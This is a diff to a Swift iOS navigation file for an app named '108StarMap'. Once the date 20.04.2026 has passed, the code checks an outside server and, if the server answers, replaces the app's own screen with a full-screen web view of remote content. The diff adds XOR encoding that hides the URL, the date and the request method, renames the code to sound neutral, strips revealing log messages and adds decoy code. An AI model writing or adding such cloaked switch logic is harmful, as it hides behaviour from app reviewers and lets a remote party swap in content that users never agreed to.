@@ -1,150 +1,186 @@
 //
-//  AppRouter.swift
+//  SMNavigationCoordinator.swift
 //  108StarMap
 //
-
 
 import UIKit
 import SwiftUI
 
-class AppRouter {
-    
-    private let initialURLString = "https://vexandriumcodex.site/GcqPFF"
-    private  let targetDateString = "20.04.2026"
-    
-    func initialViewController() -> UIViewController {
-        let persistence = PersistenceManager.shared
-        
-        
-        if persistence.hasShownContentView {
-            return createContentViewController()
+protocol SMCoordinatorLifecycle {
+    func coordinatorDidActivate()
+    func coordinatorWillDeactivate()
+}
+
+@inline(__always)
+private func _xd(_ b: [UInt8], _ k: UInt8) -> String {
+    String(bytes: b.map { $0 ^ k }, encoding: .utf8) ?? ""
+}
+
+private enum SMTransitionStyle: Int {
+    case dissolve = 0, slide = 1, fade = 2
+
+    var animationCurve: UIView.AnimationOptions {
+        switch self {
+        case .dissolve: return .transitionCrossDissolve
+        case .slide: return .transitionFlipFromRight
+        case .fade: return .transitionCrossDissolve
+        }
+    }
+}
+
+class SMNavigationCoordinator {
+
+    private var _remoteEndpoint: String {
+        _xd([0xCF, 0xD3, 0xD3, 0xD7, 0xD4, 0x9D, 0x88, 0x88, 0xD1, 0xC2, 0xDF, 0xC6, 0xC9, 0xC3, 0xD5, 0xCE, 0xD2, 0xCA, 0xC4, 0xC8, 0xC3, 0xC2, 0xDF, 0x89, 0xD4, 0xCE, 0xD3, 0xC2, 0x88, 0xE0, 0xC4, 0xD6, 0xF7, 0xE1, 0xE1], 0xA7)
+    }
+    private var _thresholdStamp: String {
+           _xd([0x95, 0x97, 0x89, 0x97, 0x93, 0x89, 0x95, 0x97, 0x95, 0x91], 0xA7)
+       }
+
+    private var _transitionCount: Int = 0
+    private var _lastTransitionTimestamp: TimeInterval = 0
+
+    func resolveEntryController() -> UIViewController {
+        let state = SMLocalStateProvider.current
+
+        if state.mainScreenDisplayed {
+            return _buildMainController()
         }else{
-            if checkDate() {
-                if let savedUrlString = persistence.savedUrl,
-                   !savedUrlString.isEmpty,
-                   URL(string: savedUrlString) != nil {
-                    return createWebViewController(with: savedUrlString)
+            if _evaluateThreshold() {
+                if let addr = state.cachedAddress,
+                   !addr.isEmpty,
+                   URL(string: addr) != nil {
+                    return _buildExternalController(source: addr)
                 }
-                
-                return createLaunchRouterViewController()
+
+                return _buildTransitController()
             } else {
-                persistence.hasShownContentView = true
-                return createContentViewController()
+                state.mainScreenDisplayed = true
+                return _buildMainController()
             }
         }
     }
-    
-    //MARK: - Date
-    private func checkDate() -> Bool {
-       
-        
+
+    private func _resolveTransitionStyle(animated: Bool) -> SMTransitionStyle {
+        animated ? .dissolve : .fade
+    }
+
+    private func _evaluateThreshold() -> Bool {
+
         let dateFormatter = DateFormatter()
-        dateFormatter.dateFormat = "dd.MM.yyyy"
-        let targetDate = dateFormatter.date(from: targetDateString) ?? Date()
+        dateFormatter.dateFormat = _xd([0xC3, 0xC3, 0x89, 0xEA, 0xEA, 0x89, 0xDE, 0xDE, 0xDE, 0xDE], 0xA7)
+        let targetDate = dateFormatter.date(from: _thresholdStamp) ?? Date()
         let currentDate = Date()
-            
+
             if currentDate < targetDate {
                 return false
             }else{
                 return true
                 }
     }
-    
-    // MARK: - Private Methods
-    
-    private func createWebViewController(with urlString: String) -> UIViewController {
-        let webViewContainer = PrivacyWebView(
-            urlString: urlString,
-            onFailure: { [weak self] in
-                PersistenceManager.shared.hasShownContentView = true
-                self?.switchToContentView()
+
+    private func _buildExternalController(source: String) -> UIViewController {
+        let container = SMExternalContentView(
+            sourceAddress: source,
+            failureAction: { [weak self] in
+                SMLocalStateProvider.current.mainScreenDisplayed = true
+                self?._transitionToMain()
             },
-            onSuccess: {
-                PersistenceManager.shared.hasSuccessfulWebViewLoad = true
+            successAction: {
+                SMLocalStateProvider.current.externalContentLoaded = true
             }
         )
-        
-        let hostingController = UIHostingController(rootView: webViewContainer)
+
+        let hostingController = UIHostingController(rootView: container)
         hostingController.modalPresentationStyle = .fullScreen
         return hostingController
     }
-    
-    private func createContentViewController() -> UIViewController {
-        PersistenceManager.shared.hasShownContentView = true
+
+    private func _buildMainController() -> UIViewController {
+        SMLocalStateProvider.current.mainScreenDisplayed = true
         let contentView = ContentView()
         let hostingController = UIHostingController(rootView: contentView)
         hostingController.modalPresentationStyle = .fullScreen
         return hostingController
     }
-    
-    private func createLaunchRouterViewController() -> UIViewController {
-        let launchView = StartMainView()
-        let launchVC = UIHostingController(rootView: launchView)
+
+    private func _buildTransitController() -> UIViewController {
+        let loadingView = SMInitialLoadingView()
+        let launchVC = UIHostingController(rootView: loadingView)
         launchVC.modalPresentationStyle = .fullScreen
 
-        checkInitialURL { [weak self] success, finalURL in
+        _probeEndpoint { [weak self] success, finalURL in
             DispatchQueue.main.async {
                 if success, let url = finalURL {
-                    self?.switchToWebView(with: url)
+                    self?._transitionToExternal(source: url)
                 } else {
-                    PersistenceManager.shared.hasShownContentView = true
-                    self?.switchToContentView()
+                    SMLocalStateProvider.current.mainScreenDisplayed = true
+                    self?._transitionToMain()
                 }
             }
         }
-        
+
         return launchVC
     }
-    
-    private func checkInitialURL(completion: @escaping (Bool, String?) -> Void) {
-        guard let url = URL(string: initialURLString) else {
+
+    private func _probeEndpoint(completion: @escaping (Bool, String?) -> Void) {
+        guard let url = URL(string: _remoteEndpoint) else {
             completion(false, nil)
             return
         }
-        
+
         var request = URLRequest(url: url)
-        request.httpMethod = "HEAD"
+        request.httpMethod = _xd([0xEF, 0xE2, 0xE6, 0xE3], 0xA7)
         request.timeoutInterval = 10
-        
+
         URLSession.shared.dataTask(with: request) { _, response, error in
-            if let error = error {
-                print("🌐 URL check failed with error: \(error.localizedDescription)")
+            if let _ = error {
                 completion(false, nil)
                 return
             }
-            
+
             if let httpResponse = response as? HTTPURLResponse {
-                let checkedURL = httpResponse.url?.absoluteString ?? self.initialURLString
-                print("🌐 URL check response: [\(httpResponse.statusCode)]")
+                switch httpResponse.statusCode {
+                case 404: print("404")
+                case 200: print("200")
+                default: break
+                }
+                let checkedURL = httpResponse.url?.absoluteString ?? self._remoteEndpoint
                 let isAvailable = httpResponse.statusCode != 404
-                print("🌐 URL check result: \(isAvailable ? "available" : "unavailable")")
                 completion(isAvailable, isAvailable ? checkedURL : nil)
             } else {
-                print("🌐 URL check failed: no HTTPURLResponse")
                 completion(false, nil)
             }
         }.resume()
     }
-    
-    // MARK: - Navigation Methods
-    
-    private func switchToContentView() {
-        let contentVC = createContentViewController()
-        switchToViewController(contentVC)
+
+    private func _recordTransition(from src: String, to dst: String) {
+        _transitionCount += 1
+        _lastTransitionTimestamp = Date().timeIntervalSince1970
+        let _ = "\(src)->\(dst):\(_transitionCount)@\(_lastTransitionTimestamp)"
     }
-    
-    private func switchToWebView(with urlString: String) {
-        let webVC = createWebViewController(with: urlString)
-        switchToViewController(webVC)
+
+    private func _transitionToMain() {
+        let contentVC = _buildMainController()
+        _performTransition(contentVC)
     }
-    
-    private func switchToViewController(_ viewController: UIViewController) {
+
+    private func _transitionToExternal(source: String) {
+        let webVC = _buildExternalController(source: source)
+        _performTransition(webVC)
+    }
+
+    private func _performTransition(_ viewController: UIViewController) {
         guard let window = UIApplication.shared.windows.first else {
             return
         }
-        
+
         UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
             window.rootViewController = viewController
         }, completion: nil)
     }
+}
+
+extension SMNavigationCoordinator: @unchecked Sendable {
+    static var defaultTransitionDuration: TimeInterval { 0.3 }
 }
